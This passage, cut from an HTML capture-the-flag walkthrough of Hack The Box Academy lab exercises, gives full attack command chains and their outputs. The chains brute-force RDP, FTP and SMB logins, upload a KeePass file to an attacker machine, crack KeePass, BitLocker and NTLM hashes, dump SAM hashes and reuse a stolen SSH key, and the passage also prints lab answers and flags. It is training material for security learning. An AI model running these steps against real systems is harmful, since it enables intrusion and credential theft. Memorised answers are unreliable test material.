</span><span id="__span-200-8"><a id="__codelineno-200-8" name="__codelineno-200-8"></a><span class="nb">sort </span><span class="n">mut_password</span><span class="p">.</span><span class="n">list</span> <span class="p">|</span> <span class="n">uniq</span> <span class="p">&gt;</span> <span class="n">unique_passwords</span><span class="p">.</span><span class="n">list</span>
</span><span id="__span-200-9"><a id="__codelineno-200-9" name="__codelineno-200-9"></a>
</span><span id="__span-200-10"><a id="__codelineno-200-10" name="__codelineno-200-10"></a><span class="c"># We will try to access with johanna user and the provided password lists mutated and cleaned.</span>
</span><span id="__span-200-11"><a id="__codelineno-200-11" name="__codelineno-200-11"></a><span class="n">hydra</span> <span class="n">-l</span> <span class="n">johanna</span> <span class="n">-P</span> <span class="n">unique_passwords</span><span class="p">.</span><span class="n">list</span> <span class="n">-t</span> <span class="n">64</span> <span class="n">-w</span> <span class="n">2</span> <span class="o">-f</span>  <span class="n">rdp</span><span class="p">://</span><span class="nv">$ip</span>
</span><span id="__span-200-12"><a id="__codelineno-200-12" name="__codelineno-200-12"></a><span class="c"># Output: [3389][rdp] host: 10.129.154.5   login: johanna   password: 1231234!</span>
</span><span id="__span-200-13"><a id="__codelineno-200-13" name="__codelineno-200-13"></a>
</span><span id="__span-200-14"><a id="__codelineno-200-14" name="__codelineno-200-14"></a><span class="c"># Connect to the host via RDP</span>
</span><span id="__span-200-15"><a id="__codelineno-200-15" name="__codelineno-200-15"></a><span class="n">xfreerdp</span> <span class="p">/</span><span class="n">u</span><span class="p">:</span><span class="n">johanna</span>  <span class="p">/</span><span class="n">p</span><span class="p">:</span><span class="s1">&#39;1231234!&#39;</span> <span class="p">/</span><span class="n">v</span><span class="p">:</span><span class="nv">$ip</span> <span class="p">/</span><span class="n">cert</span><span class="p">:</span><span class="n">ignore</span> 
</span><span id="__span-200-16"><a id="__codelineno-200-16" name="__codelineno-200-16"></a>
</span><span id="__span-200-17"><a id="__codelineno-200-17" name="__codelineno-200-17"></a><span class="c"># Browsing around we spot the file Logins.kdbx, a typical keepass file. We will transfer it to our kali machine to try to crack it offline:</span>
</span><span id="__span-200-18"><a id="__codelineno-200-18" name="__codelineno-200-18"></a>
</span><span id="__span-200-19"><a id="__codelineno-200-19" name="__codelineno-200-19"></a><span class="c"># 1. From the kali machine, we will serve the PSUpload.ps1 script</span>
</span><span id="__span-200-20"><a id="__codelineno-200-20" name="__codelineno-200-20"></a><span class="n">python3</span> <span class="n">-m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="n">8001</span>
</span><span id="__span-200-21"><a id="__codelineno-200-21" name="__codelineno-200-21"></a>
</span><span id="__span-200-22"><a id="__codelineno-200-22" name="__codelineno-200-22"></a><span class="c"># 2. From the RDP connection we will download the PSUpload.ps1 to c:\Users\johanna\Documents. Open a powershell</span>
</span><span id="__span-200-23"><a id="__codelineno-200-23" name="__codelineno-200-23"></a><span class="nb">cd </span><span class="n">c</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">johanna</span><span class="p">\</span><span class="n">Documents</span>
</span><span id="__span-200-24"><a id="__codelineno-200-24" name="__codelineno-200-24"></a><span class="nb">Invoke-WebRequest</span> <span class="n">http</span><span class="p">://</span><span class="nv">$ipKali</span><span class="p">:</span><span class="n">8001</span><span class="p">/</span><span class="n">PSUpload</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Outfile</span> <span class="n">PSUpload</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-200-25"><a id="__codelineno-200-25" name="__codelineno-200-25"></a>
</span><span id="__span-200-26"><a id="__codelineno-200-26" name="__codelineno-200-26"></a><span class="c"># 3. From the kali machine, launch uploadserver. It will listen on port 8000</span>
</span><span id="__span-200-27"><a id="__codelineno-200-27" name="__codelineno-200-27"></a><span class="n">python3</span> <span class="n">-m</span> <span class="n">uploadserver</span>
</span><span id="__span-200-28"><a id="__codelineno-200-28" name="__codelineno-200-28"></a>
</span><span id="__span-200-29"><a id="__codelineno-200-29" name="__codelineno-200-29"></a><span class="c"># 4. From the RDP connection, import the PSUpload module and upload the keepass file to our kali attacking machien:</span>
</span><span id="__span-200-30"><a id="__codelineno-200-30" name="__codelineno-200-30"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PSUpload</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-200-31"><a id="__codelineno-200-31" name="__codelineno-200-31"></a><span class="nb">Invoke-FileUpload</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="nv">$ipAttackingmachien</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span><span class="n">upload</span> <span class="o">-File</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">johanna</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">Logins</span><span class="p">.</span><span class="n">kdbx</span>
</span><span id="__span-200-32"><a id="__codelineno-200-32" name="__codelineno-200-32"></a>
</span><span id="__span-200-33"><a id="__codelineno-200-33" name="__codelineno-200-33"></a><span class="c"># From attacking machine, use the module keepass2john to extract a hash:</span>
</span><span id="__span-200-34"><a id="__codelineno-200-34" name="__codelineno-200-34"></a><span class="n">keepass2john</span> <span class="n">Logins</span><span class="p">.</span><span class="n">kdbx</span> <span class="p">&gt;</span> <span class="n">keepass</span><span class="p">.</span><span class="n">hashes</span>
</span><span id="__span-200-35"><a id="__codelineno-200-35" name="__codelineno-200-35"></a>
</span><span id="__span-200-36"><a id="__codelineno-200-36" name="__codelineno-200-36"></a><span class="c"># Launch a dictionary attack:</span>
</span><span id="__span-200-37"><a id="__codelineno-200-37" name="__codelineno-200-37"></a><span class="n">john</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=</span><span class="n">mut_password</span><span class="p">.</span><span class="n">list</span> <span class="n">keepass</span><span class="p">.</span><span class="n">hashes</span> 
</span><span id="__span-200-38"><a id="__codelineno-200-38" name="__codelineno-200-38"></a><span class="c"># Output: Qwerty7!</span>
</span><span id="__span-200-39"><a id="__codelineno-200-39" name="__codelineno-200-39"></a>
</span><span id="__span-200-40"><a id="__codelineno-200-40" name="__codelineno-200-40"></a><span class="c"># Now in the RDP connection, open the keepass file and enter the masterkey. You will access to the creds:</span>
</span><span id="__span-200-41"><a id="__codelineno-200-41" name="__codelineno-200-41"></a><span class="c"># david:gRzX7YbeTcDG7</span>
</span><span id="__span-200-42"><a id="__codelineno-200-42" name="__codelineno-200-42"></a>
</span><span id="__span-200-43"><a id="__codelineno-200-43" name="__codelineno-200-43"></a><span class="c"># With these creds we can access the samba share service. We enumerate and access</span>
</span><span id="__span-200-44"><a id="__codelineno-200-44" name="__codelineno-200-44"></a><span class="n">smbmap</span> <span class="n">-H</span> <span class="nv">$ip</span> <span class="n">-U</span> <span class="n">david</span>
</span><span id="__span-200-45"><a id="__codelineno-200-45" name="__codelineno-200-45"></a><span class="n">smbclient</span> <span class="p">\\\\</span><span class="nv">$ip</span><span class="p">\\</span><span class="n">david</span> <span class="n">-U</span> <span class="n">david</span>
</span><span id="__span-200-46"><a id="__codelineno-200-46" name="__codelineno-200-46"></a>
</span><span id="__span-200-47"><a id="__codelineno-200-47" name="__codelineno-200-47"></a><span class="c"># We list and note an interesting file. Download it.</span>
</span><span id="__span-200-48"><a id="__codelineno-200-48" name="__codelineno-200-48"></a><span class="nb">dir</span>
</span><span id="__span-200-49"><a id="__codelineno-200-49" name="__codelineno-200-49"></a><span class="n">get</span> <span class="n">Backup</span><span class="p">.</span><span class="n">vhd</span>
</span><span id="__span-200-50"><a id="__codelineno-200-50" name="__codelineno-200-50"></a>
</span><span id="__span-200-51"><a id="__codelineno-200-51" name="__codelineno-200-51"></a><span class="c"># Now we will try to crack it. First we will extract the hashes</span>
</span><span id="__span-200-52"><a id="__codelineno-200-52" name="__codelineno-200-52"></a><span class="n">bitlocker2john</span> <span class="n">-i</span> <span class="n">Backup</span><span class="p">.</span><span class="n">vhd</span> <span class="p">&gt;</span> <span class="n">backup</span><span class="p">.</span><span class="n">hashes</span>
</span><span id="__span-200-53"><a id="__codelineno-200-53" name="__codelineno-200-53"></a><span class="n">grep</span> <span class="s2">&quot;bitlocker\$0&quot;</span> <span class="n">backup</span><span class="p">.</span><span class="n">hashes</span> <span class="p">&gt;</span> <span class="n">backup</span><span class="p">.</span><span class="n">hash</span>
</span><span id="__span-200-54"><a id="__codelineno-200-54" name="__codelineno-200-54"></a>
</span><span id="__span-200-55"><a id="__codelineno-200-55" name="__codelineno-200-55"></a><span class="c"># And now we crack it</span>
</span><span id="__span-200-56"><a id="__codelineno-200-56" name="__codelineno-200-56"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">22100</span> <span class="n">backup</span><span class="p">.</span><span class="n">hash</span> <span class="n">mut_password</span><span class="p">.</span><span class="n">list</span> <span class="n">-o</span> <span class="n">backup</span><span class="p">.</span><span class="n">cracked</span> 
</span><span id="__span-200-57"><a id="__codelineno-200-57" name="__codelineno-200-57"></a><span class="nb">cat </span><span class="n">backup</span><span class="p">.</span><span class="n">cracked</span>
</span><span id="__span-200-58"><a id="__codelineno-200-58" name="__codelineno-200-58"></a><span class="c"># Output: 123456789!</span>
</span><span id="__span-200-59"><a id="__codelineno-200-59" name="__codelineno-200-59"></a>
</span><span id="__span-200-60"><a id="__codelineno-200-60" name="__codelineno-200-60"></a>
</span><span id="__span-200-61"><a id="__codelineno-200-61" name="__codelineno-200-61"></a><span class="c"># Install the libguestfs-tools package, which provides tools for accessing and manipulating virtual disk images (e.g., .vhd files).</span>
</span><span id="__span-200-62"><a id="__codelineno-200-62" name="__codelineno-200-62"></a><span class="n">sudo</span> <span class="n">apt-get</span> <span class="n">install</span> <span class="n">libguestfs-tools</span>
</span><span id="__span-200-63"><a id="__codelineno-200-63" name="__codelineno-200-63"></a>
</span><span id="__span-200-64"><a id="__codelineno-200-64" name="__codelineno-200-64"></a><span class="c"># Install the cifs-utils package, which is used for mounting SMB (CIFS) network shares.</span>
</span><span id="__span-200-65"><a id="__codelineno-200-65" name="__codelineno-200-65"></a><span class="n">sudo</span> <span class="n">apt-get</span> <span class="n">install</span> <span class="n">cifs-utils</span>
</span><span id="__span-200-66"><a id="__codelineno-200-66" name="__codelineno-200-66"></a>
</span><span id="__span-200-67"><a id="__codelineno-200-67" name="__codelineno-200-67"></a><span class="c"># Install the dislocker package, which is used for accessing BitLocker-encrypted drives on Linux.</span>
</span><span id="__span-200-68"><a id="__codelineno-200-68" name="__codelineno-200-68"></a><span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">dislocker</span>
</span><span id="__span-200-69"><a id="__codelineno-200-69" name="__codelineno-200-69"></a>
</span><span id="__span-200-70"><a id="__codelineno-200-70" name="__codelineno-200-70"></a><span class="c"># Create directories where the BitLocker volume and its decrypted contents will be mounted.</span>
</span><span id="__span-200-71"><a id="__codelineno-200-71" name="__codelineno-200-71"></a><span class="n">sudo</span> <span class="n">mkdir</span> <span class="p">/</span><span class="n">media</span><span class="p">/</span><span class="n">backup_bitlocker</span> <span class="p">/</span><span class="n">media</span><span class="p">/</span><span class="nb">mount </span> 
</span><span id="__span-200-72"><a id="__codelineno-200-72" name="__codelineno-200-72"></a>
</span><span id="__span-200-73"><a id="__codelineno-200-73" name="__codelineno-200-73"></a><span class="c"># Attach the .vhd file located at /mnt/smbshare/backup.vhd to a loop device (/dev/loop100) </span>
</span><span id="__span-200-74"><a id="__codelineno-200-74" name="__codelineno-200-74"></a><span class="c"># and scan for partitions (using the -P flag).</span>
</span><span id="__span-200-75"><a id="__codelineno-200-75" name="__codelineno-200-75"></a><span class="n">sudo</span> <span class="n">losetup</span> <span class="n">-P</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">loop100</span> <span class="p">/</span><span class="n">mnt</span><span class="p">/</span><span class="n">smbshare</span><span class="p">/</span><span class="n">backup</span><span class="p">.</span><span class="n">vhd</span>  
</span><span id="__span-200-76"><a id="__codelineno-200-76" name="__codelineno-200-76"></a>
</span><span id="__span-200-77"><a id="__codelineno-200-77" name="__codelineno-200-77"></a><span class="c"># Use dislocker to unlock the BitLocker-encrypted partition (/dev/loop100p2). </span>
</span><span id="__span-200-78"><a id="__codelineno-200-78" name="__codelineno-200-78"></a><span class="c"># The -v flag enables verbose output, -V specifies the BitLocker partition, </span>
</span><span id="__span-200-79"><a id="__codelineno-200-79" name="__codelineno-200-79"></a><span class="c"># and -u prompts for the BitLocker password. The decrypted data is mounted to /media/backup_bitlocker.</span>
</span><span id="__span-200-80"><a id="__codelineno-200-80" name="__codelineno-200-80"></a><span class="n">sudo</span> <span class="n">dislocker</span> <span class="n">-v</span> <span class="n">-V</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">loop100p2</span> <span class="n">-u</span> <span class="p">--</span> <span class="p">/</span><span class="n">media</span><span class="p">/</span><span class="n">backup_bitlocker</span>  
</span><span id="__span-200-81"><a id="__codelineno-200-81" name="__codelineno-200-81"></a>
</span><span id="__span-200-82"><a id="__codelineno-200-82" name="__codelineno-200-82"></a><span class="c"># Mount the dislocker-file (the virtual decrypted representation of the BitLocker drive) as a loop device and make it writable. The contents will be accessible at /media/mount.</span>
</span><span id="__span-200-83"><a id="__codelineno-200-83" name="__codelineno-200-83"></a><span class="n">sudo</span> <span class="nb">mount </span><span class="n">-o</span> <span class="n">loop</span><span class="p">,</span><span class="n">rw</span> <span class="p">/</span><span class="n">media</span><span class="p">/</span><span class="n">backup_bitlocker</span><span class="p">/</span><span class="n">dislocker</span><span class="o">-file</span> <span class="p">/</span><span class="n">media</span><span class="p">/</span><span class="nb">mount </span> 
</span><span id="__span-200-84"><a id="__codelineno-200-84" name="__codelineno-200-84"></a>
</span><span id="__span-200-85"><a id="__codelineno-200-85" name="__codelineno-200-85"></a><span class="c"># List the contents of the decrypted and mounted BitLocker volume to verify the files are accessible.</span>
</span><span id="__span-200-86"><a id="__codelineno-200-86" name="__codelineno-200-86"></a><span class="nb">ls </span><span class="n">-la</span> <span class="p">/</span><span class="n">media</span><span class="p">/</span><span class="nb">mount</span>
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-201-1">1</a></span>
<span class="normal"><a href="#__codelineno-201-2">2</a></span>
<span class="normal"><a href="#__codelineno-201-3">3</a></span>
<span class="normal"><a href="#__codelineno-201-4">4</a></span>
<span class="normal"><a href="#__codelineno-201-5">5</a></span>
<span class="normal"><a href="#__codelineno-201-6">6</a></span>
<span class="normal"><a href="#__codelineno-201-7">7</a></span>
<span class="normal"><a href="#__codelineno-201-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-201-1"><a id="__codelineno-201-1" name="__codelineno-201-1"></a># Output
</span><span id="__span-201-2"><a id="__codelineno-201-2" name="__codelineno-201-2"></a>total 19104
</span><span id="__span-201-3"><a id="__codelineno-201-3" name="__codelineno-201-3"></a>drwxrwxrwx 1 root root        0 Feb 11  2022 &#39;$RECYCLE.BIN&#39;
</span><span id="__span-201-4"><a id="__codelineno-201-4" name="__codelineno-201-4"></a>drwxrwxrwx 1 root root     4096 Feb 11  2022  .
</span><span id="__span-201-5"><a id="__codelineno-201-5" name="__codelineno-201-5"></a>drwxr-xr-x 6 root root     4096 Jan 20 17:25  ..
</span><span id="__span-201-6"><a id="__codelineno-201-6" name="__codelineno-201-6"></a>-rwxrwxrwx 1 root root    77824 Feb 11  2022  SAM
</span><span id="__span-201-7"><a id="__codelineno-201-7" name="__codelineno-201-7"></a>-rwxrwxrwx 1 root root 19472384 Feb 11  2022  SYSTEM
</span><span id="__span-201-8"><a id="__codelineno-201-8" name="__codelineno-201-8"></a>drwxrwxrwx 1 root root     4096 Feb 11  2022 &#39;System Volume Information&#39;
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-202-1">1</a></span>
<span class="normal"><a href="#__codelineno-202-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-202-1"><a id="__codelineno-202-1" name="__codelineno-202-1"></a># We can use secretsdump to extract the hives:
</span><span id="__span-202-2"><a id="__codelineno-202-2" name="__codelineno-202-2"></a>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL 
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-203-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-203-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-203-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-203-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-203-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-203-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-203-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-203-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-203-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-203-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-203-1"><a id="__codelineno-203-1" name="__codelineno-203-1"></a>[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
</span><span id="__span-203-2"><a id="__codelineno-203-2" name="__codelineno-203-2"></a>[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
</span><span id="__span-203-3"><a id="__codelineno-203-3" name="__codelineno-203-3"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
</span><span id="__span-203-4"><a id="__codelineno-203-4" name="__codelineno-203-4"></a>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span id="__span-203-5"><a id="__codelineno-203-5" name="__codelineno-203-5"></a>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span id="__span-203-6"><a id="__codelineno-203-6" name="__codelineno-203-6"></a>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
</span><span id="__span-203-7"><a id="__codelineno-203-7" name="__codelineno-203-7"></a>sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
</span><span id="__span-203-8"><a id="__codelineno-203-8" name="__codelineno-203-8"></a>david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
</span><span id="__span-203-9"><a id="__codelineno-203-9" name="__codelineno-203-9"></a>johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::
</span><span id="__span-203-10"><a id="__codelineno-203-10" name="__codelineno-203-10"></a>[*] Cleaning up... 
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-204-1">1</a></span>
<span class="normal"><a href="#__codelineno-204-2">2</a></span>
<span class="normal"><a href="#__codelineno-204-3">3</a></span>
<span class="normal"><a href="#__codelineno-204-4">4</a></span>
<span class="normal"><a href="#__codelineno-204-5">5</a></span>
<span class="normal"><a href="#__codelineno-204-6">6</a></span>
<span class="normal"><a href="#__codelineno-204-7">7</a></span>
<span class="normal"><a href="#__codelineno-204-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-204-1"><a id="__codelineno-204-1" name="__codelineno-204-1"></a># Cracking the Administrator NTLM
</span><span id="__span-204-2"><a id="__codelineno-204-2" name="__codelineno-204-2"></a>hashcat -m 1000 e53d4d912d96874e83429886c7bf22a1 mut_passwords.list
</span><span id="__span-204-3"><a id="__codelineno-204-3" name="__codelineno-204-3"></a># Output: Liverp00l8!
</span><span id="__span-204-4"><a id="__codelineno-204-4" name="__codelineno-204-4"></a>
</span><span id="__span-204-5"><a id="__codelineno-204-5" name="__codelineno-204-5"></a># Access with RDP
</span><span id="__span-204-6"><a id="__codelineno-204-6" name="__codelineno-204-6"></a>xfreerdp /u:Administrator  /p:&#39;Liverp00l8!&#39; /v:$ip /cert:ignore
</span><span id="__span-204-7"><a id="__codelineno-204-7" name="__codelineno-204-7"></a>
</span><span id="__span-204-8"><a id="__codelineno-204-8" name="__codelineno-204-8"></a># Open the flag.txt in the Desktop
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{PWcr4ck1ngokokok}</p>
<h2 id="attacking-common-services"><a href="https://academy.hackthebox.com/module/details/116">Attacking Common Services</a></h2>
<h3 id="ftp_1">FTP</h3>
<p><strong>What port is the FTP service running on?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-205-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-205-1"><a id="__codelineno-205-1" name="__codelineno-205-1"></a>sudo nmap -sC -sV $ip -Pn -p-
</span></code></pre></div></td></tr></table></div>
<p>Results: 2121</p>
<p><strong>What username is available for the FTP server?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-206-1">1</a></span>
<span class="normal"><a href="#__codelineno-206-2">2</a></span>
<span class="normal"><a href="#__codelineno-206-3">3</a></span>
<span class="normal"><a href="#__codelineno-206-4">4</a></span>
<span class="normal"><a href="#__codelineno-206-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-206-1"><a id="__codelineno-206-1" name="__codelineno-206-1"></a># Footprint the service and check out that anonymous user is enabled. Login into the ftp service and download the userlist and password list. After that...
</span><span id="__span-206-2"><a id="__codelineno-206-2" name="__codelineno-206-2"></a>
</span><span id="__span-206-3"><a id="__codelineno-206-3" name="__codelineno-206-3"></a># Two ways:
</span><span id="__span-206-4"><a id="__codelineno-206-4" name="__codelineno-206-4"></a>medusa -U users.list  -P pws.list -h $ip  -M ftp -n 2121
</span><span id="__span-206-5"><a id="__codelineno-206-5" name="__codelineno-206-5"></a>hydra -L users.list  -P pws.list ftp://$ip:2121 
</span></code></pre></div></td></tr></table></div>
<p>Results:  robin</p>
<p><strong>Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-207-1">1</a></span>
<span class="normal"><a href="#__codelineno-207-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-207-1"><a id="__codelineno-207-1" name="__codelineno-207-1"></a>ssh robin@$ip
</span><span id="__span-207-2"><a id="__codelineno-207-2" name="__codelineno-207-2"></a>cat flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{ATT4CK1NG_F7P_53RV1C3}</p>
<h3 id="smb_1">SMB</h3>
<p><strong>What is the name of the shared folder with READ permissions?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-208-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-208-1"><a id="__codelineno-208-1" name="__codelineno-208-1"></a>smbmap -H $ip
</span></code></pre></div></td></tr></table></div>
<p>Results: GGJ</p>
<p><strong>What is the password for the username "jason"?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-209-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-209-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-209-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-209-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-209-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-209-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-209-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-209-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-209-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-209-10">10</a></span>
<span class="normal"><a href="#__codelineno-209-11">11</a></span>
<span class="normal"><a href="#__codelineno-209-12">12</a></span>
<span class="normal"><a href="#__codelineno-209-13">13</a></span>
<span class="normal"><a href="#__codelineno-209-14">14</a></span>
<span class="normal"><a href="#__codelineno-209-15">15</a></span>
<span class="normal"><a href="#__codelineno-209-16">16</a></span>
<span class="normal"><a href="#__codelineno-209-17">17</a></span>
<span class="normal"><a href="#__codelineno-209-18">18</a></span>
<span class="normal"><a href="#__codelineno-209-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-209-1"><a id="__codelineno-209-1" name="__codelineno-209-1"></a>sudo nmap -sC -sV $ip -Pn
</span><span id="__span-209-2"><a id="__codelineno-209-2" name="__codelineno-209-2"></a># Results 22,53, 139,445,2121
</span><span id="__span-209-3"><a id="__codelineno-209-3" name="__codelineno-209-3"></a>
</span><span id="__span-209-4"><a id="__codelineno-209-4" name="__codelineno-209-4"></a>ftp $ip 2121
</span><span id="__span-209-5"><a id="__codelineno-209-5" name="__codelineno-209-5"></a># Enter anonymous and anonymous
</span><span id="__span-209-6"><a id="__codelineno-209-6" name="__codelineno-209-6"></a>
</span><span id="__span-209-7"><a id="__codelineno-209-7" name="__codelineno-209-7"></a># Download files
</span><span id="__span-209-8"><a id="__codelineno-209-8" name="__codelineno-209-8"></a>mget *.list
</span><span id="__span-209-9"><a id="__codelineno-209-9" name="__codelineno-209-9"></a>
</span><span id="__span-209-10"><a id="__codelineno-209-10" name="__codelineno-209-10"></a># Checksmb services
</span><span id="__span-209-11"><a id="__codelineno-209-11" name="__codelineno-209-11"></a>smbmap -H //
</span><span id="__span-209-12"><a id="__codelineno-209-12" name="__codelineno-209-12"></a>smbclient //$ip/GGJ -N
</span><span id="__span-209-13"><a id="__codelineno-209-13" name="__codelineno-209-13"></a>smbclient //$ip/GGJ -N -r
</span><span id="__span-209-14"><a id="__codelineno-209-14" name="__codelineno-209-14"></a>
</span><span id="__span-209-15"><a id="__codelineno-209-15" name="__codelineno-209-15"></a># However, downloading the id_rsa file is not possible due to permissions. 
</span><span id="__span-209-16"><a id="__codelineno-209-16" name="__codelineno-209-16"></a>smbmap -H  $ip --download GGJ/id_rsa  //NOT WORKING 
</span><span id="__span-209-17"><a id="__codelineno-209-17" name="__codelineno-209-17"></a>
</span><span id="__span-209-18"><a id="__codelineno-209-18" name="__codelineno-209-18"></a># We will download from resources pwd.list and launch a brute for attack 
</span><span id="__span-209-19"><a id="__codelineno-209-19" name="__codelineno-209-19"></a>crackmapexec smb $ip -u jason -p pws.list  -d ATTCSVC-LINUX
</span></code></pre></div></td></tr></table></div>
<p>Results: 34c8zuNBo91!@28Bszh</p>
<p><strong>Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-210-1">1</a></span>
<span class="normal"><a href="#__codelineno-210-2">2</a></span>
<span class="normal"><a href="#__codelineno-210-3">3</a></span>
<span class="normal"><a href="#__codelineno-210-4">4</a></span>
<span class="normal"><a href="#__codelineno-210-5">5</a></span>
<span class="normal"><a href="#__codelineno-210-6">6</a></span>
<span class="normal"><a href="#__codelineno-210-7">7</a></span>
<span class="normal"><a href="#__codelineno-210-8">8</a></span>
<span class="normal"><a href="#__codelineno-210-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-210-1"><a id="__codelineno-210-1" name="__codelineno-210-1"></a># Log in as jason
</span><span id="__span-210-2"><a id="__codelineno-210-2" name="__codelineno-210-2"></a>smbclient  //$ip/GGJ -U jason
</span><span id="__span-210-3"><a id="__codelineno-210-3" name="__codelineno-210-3"></a>#Enter password
</span><span id="__span-210-4"><a id="__codelineno-210-4" name="__codelineno-210-4"></a>get id_rsa
</span><span id="__span-210-5"><a id="__codelineno-210-5" name="__codelineno-210-5"></a>quit
</span><span id="__span-210-6"><a id="__codelineno-210-6" name="__codelineno-210-6"></a>
</span><span id="__span-210-7"><a id="__codelineno-210-7" name="__codelineno-210-7"></a>chmod 600 id_rsa
</span><span id="__span-210-8"><a id="__codelineno-210-8" name="__codelineno-210-8"></a>ssh -i id_rsa jason@$ip
</span><span id="__span-210-9"><a id="__codelineno-210-9" name="__codelineno-210-9"></a>cat flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{SMB_4TT4CKS_2349872359}</p>
<h3 id="sql-databases">SQL Databases</h3>
<p>Authenticate to $ip with user "htbdbuser" and password "MSSQLAccess01!"</p>
<p><strong>What is the password for the "mssqlsvc" user?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-211-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-211-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-211-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-211-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-211-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-211-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-211-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-211-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-211-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-211-10">10</a></span>
<span class="normal"><a href="#__codelineno-211-11">11</a></span>
<span class="normal"><a href="#__codelineno-211-12">12</a></span>
